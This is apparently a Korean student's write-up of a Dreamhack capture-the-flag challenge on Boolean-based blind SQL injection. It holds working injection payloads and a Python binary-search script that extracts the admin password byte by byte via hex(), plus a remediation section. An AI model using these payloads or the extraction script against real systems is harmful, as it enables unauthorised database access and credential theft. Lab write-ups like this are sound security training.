# 실습 보고서 - Blind SQL Injection (Dreamhack)

> 실습 환경: **Dreamhack (https://dreamhack.io)**
> 문제: blind sql injection advanced
> 실습자: 강은채
> 실습일: 2026-09-21

---

## 1. 문제 정보
- **문제명**: blind sql injection advanced
- **분야**: Web Hacking / SQL Injection (Boolean-based Blind)
- **접속 주소**: http://host3.dreamhack.games:11004/  (인스턴스마다 다름)
- **목표**: admin 계정의 `upw` 컬럼(= FLAG)을 알아낸다.

---

## 2. Blind SQLi란? (simple_sqli와의 차이)

| 구분 | simple_sqli (인증 우회) | Blind SQLi (본 문제) |
|------|------------------------|----------------------|
| 화면 출력 | 로그인 성공 시 FLAG 직접 노출 | 데이터가 화면에 안 나옴 |
| 공격 방식 | `admin" and 1=1 -- -` 로 조건 무력화 | 참/거짓 반응 차이로 한 글자씩 추출 |
| 필요 도구 | 페이로드 1개면 충분 | 반복 요청 → 스크립트 자동화 |

- **Boolean-based**: 참일 때와 거짓일 때 응답이 다른 점을 이용
- **Time-based**: 참일 때만 `SLEEP()`으로 응답이 느려지는 점을 이용 (본 문제는 Boolean-based)

---

## 3. 소스코드 분석

### 3-1. 취약 지점 (app.py)
```python
uid = request.args.get('uid', '')
...
nrows = cur.execute(f"SELECT * FROM users WHERE uid='{uid}';")
```
- GET 파라미터 `uid` 가 **작은따옴표(`'`) 안에 그대로 삽입**된다 → 따옴표 탈출로 쿼리 조작 가능.
- Prepared Statement를 쓰지 않고 f-string으로 쿼리를 조립한 것이 근본 원인.

### 3-2. 목표 데이터 (init.sql)
```sql
INSERT INTO users (uid, upw) values ('admin', 'DH{**FLAG**}');
```
- **admin의 `upw` 컬럼 자체가 FLAG.** 이 값을 한 글자씩 추출하는 것이 목표.
- DB 문자셋: `CREATE DATABASE user_db CHARACTER SET utf8;` → **멀티바이트 문자 가능성** (뒤 6절 참고)

### 3-3. 오라클 (참/거짓 신호) — app.py 템플릿
```html
{% if nrows == 1%}
    user "{{uid}}" exists.
{% endif %}
```
- 쿼리 결과가 **1행이면 응답에 `exists.` 문구가 포함**되고, 0행이면 없다.
- 이 차이가 참/거짓을 구분하는 **오라클(oracle)** 이 된다.

---

## 4. 공격 설계

### 4-1. 페이로드 구조
`uid` 파라미터에 다음을 삽입:
```
admin' and <조건>-- -
```
최종 생성 쿼리:
```sql
SELECT * FROM users WHERE uid='admin' and <조건>-- -';
```
- `admin'` : 앞 따옴표를 닫고 admin 행으로 한정
- `and <조건>` : 우리가 검사할 조건
- `-- -` : 뒤에 남는 `';` 를 주석 처리 (MySQL 주석 `-- ` 는 뒤에 공백 필요)

### 4-2. 사용한 SQL 함수
- `length(upw)` : 값의 길이 확인
- `substr(upw, pos, 1)` : pos 번째 한 글자 추출
- `ascii(...)` / `hex(...)` : 글자를 숫자/16진수로 변환해 비교

### 4-3. 참/거짓 판별 실제 확인
브라우저에서 직접 테스트:
```
/?uid=admin' and length(upw)>10-- -
→ user "..." exists.   (참: 길이가 10보다 큼)
```

---

## 5. 자동화 스크립트

손으로 수백 번 요청할 수 없으므로 **이진 탐색(binary search)** 으로 각 글자를 추출.
글자당 약 7~8회 요청이면 값을 특정할 수 있다. (전체 스크립트: `solve_blind.py`)

핵심 로직:
```python
def is_true(cond):                      # 오라클: exists. 포함 여부
    p = f"admin' and {cond}-- -"
    return 'exists.' in s.get(HOST, params={'uid': p}).text

def find_hexchar(pos):                   # hex(upw)의 pos번째 글자를 이진탐색
    lo, hi = 0, 127
    while lo < hi:
        m = (lo + hi) // 2
        if is_true(f'ascii(substr(hex(upw),{pos},1))>{m}'):
            lo = m + 1
        else:
            hi = m
    return lo                            # 끝을 넘으면 0 -> 종료
```

---

## 6. 시행착오 & 해결 (중요 학습 포인트)

### (1) 요청을 너무 빨리 몰아 보내면 응답이 흔들린다
- 처음엔 딜레이 없이 연속 요청 → 중간부터 오라클이 불안정해져 FLAG가 깨짐.
- **해결**: 요청 간 짧은 딜레이 + 재시도 추가. (진단 결과 인스턴스 자체는 정상)

### (2) 재확인 로직의 무한 재귀
- 이진탐색 결과를 등호(=)로 재확인 후 실패 시 재귀 호출 → 무한 루프로 멈춤.
- **해결**: 인스턴스가 일관된 응답을 주는 것을 진단으로 확인하고 재귀 제거.

### (3) 탐색 범위 제한 — 멀티바이트 문자 ★
- 처음엔 `ascii(substr(upw,pos,1))` 값을 **0~127 범위**에서 이진탐색하도록 짰다.
- 그런데 앞의 `DH{` 이후 몇 글자가 계속 **127로 수렴**했다.
- 확인해보니 `ascii()` 가 127을 돌려준 게 아니라, **실제 바이트 값이 127보다 큰데
  탐색 범위를 0~127로 잡아둬서** 상한인 127에 걸린 것이었다.
- 원인: DB가 `utf8` 이라 FLAG에 한글(멀티바이트)이 들어있었고,
  UTF-8에서 한글의 첫 바이트는 0xEC 같은 128 이상 값이라 ASCII 범위를 벗어난다.
- **해결**: 문자 단위가 아니라 `hex(upw)` 로 **바이트를 16진수(0-9A-F, 항상 ASCII)로 추출**한 뒤,
  Python에서 `bytes.fromhex(...).decode('utf-8')` 로 원문을 복원했다.

> 정리하면, 추출할 데이터가 ASCII라고 가정하고 범위를 좁게 잡은 게 문제였다.
> 대상이 어떤 문자셋인지 모를 때는 `hex()` 로 바이트를 뽑는 편이 안전하다.

---

## 7. FLAG 획득
- HEX 추출 → UTF-8 디코딩으로 복원.
- **HEX(upw)**: `44487BEC9DB4EAB283EC9DB4EBB984EBB080EBB288ED98B8213F7D`
- **획득 FLAG**: `DH{이것이비밀번호!?}`
- FLAG에 한글("이것이비밀번호")이 포함되어 있어, `ascii()` 단순 추출로는 복원할 수 없고
  `hex()` 로 바이트를 추출한 뒤 UTF-8 디코딩해야 했다. (6-(3) 참고)

---

## 8. 취약점 발생 원인
- 사용자 입력(`uid`)을 SQL 쿼리 문자열에 직접 삽입 (Prepared Statement 미사용).
- 응답에 참/거짓을 구분할 수 있는 차이(`exists.`)가 존재 → 오라클 제공.

---

## 9. 대응 방안
```python
# 취약 — 입력을 쿼리 문자열에 직접 삽입
nrows = cur.execute(f"SELECT * FROM users WHERE uid='{uid}';")

# 안전 — Prepared Statement (파라미터 바인딩)
nrows = cur.execute("SELECT * FROM users WHERE uid=%s", (uid,))
```
1. **Prepared Statement (파라미터 바인딩)** — 쿼리 구조와 데이터 분리 (근본 대책)
2. **입력값 검증** — 허용된 형식만 통과 (화이트리스트)
3. **오라클 제거** — 존재/성공 여부에 따라 응답을 다르게 주지 않기
4. **DB 계정 최소 권한** — 애플리케이션 계정에 불필요한 권한 제거
5. **에러 메시지 숨기기**

---

## 10. 풀이 흐름 요약
```
소스코드 분석 (uid 직접 삽입 확인)
      ↓
오라클 발견 (nrows==1 -> "exists.")
      ↓
페이로드 설계: admin' and <조건>-- -
      ↓
브라우저로 참/거짓 동작 확인 (length>10)
      ↓
Python 이진탐색 스크립트 작성
      ↓
[시행착오] 속도/재귀/인코딩 문제 해결
      ↓
hex(upw) 로 바이트 단위 추출 -> UTF-8 복원
      ↓
FLAG 획득
```

---

## 11. 배운 점 / 회고
- 이번 문제를 풀면서, 페이로드를 외우는 것보다 먼저 소스코드에서 입력값이
  어디로 들어가고 응답이 어떻게 달라지는지(오라클)를 찾는 게 중요하다는 걸 알았다.
- simple_sqli는 로그인만 우회하면 끝이었는데, 이번엔 데이터가 화면에 안 보여서
  참/거짓 신호만으로 값을 한 글자씩 복원해야 했던 게 확실히 달랐다.
- 특히 처음엔 ASCII만 생각하고 탐색 범위를 0~127로 잡았다가 한글에서 막혔고,
  이 과정에서 대상 데이터의 문자셋/인코딩도 같이 확인해야 한다는 걸 알게 됐다.
- 스크립트를 돌리면서 요청 속도나 예외 처리를 신경 안 쓰면 결과가 흔들린다는 것도
  직접 겪어봤다.

---

### 참고 자료
- OWASP Blind SQL Injection: https://owasp.org/www-community/attacks/Blind_SQL_Injection
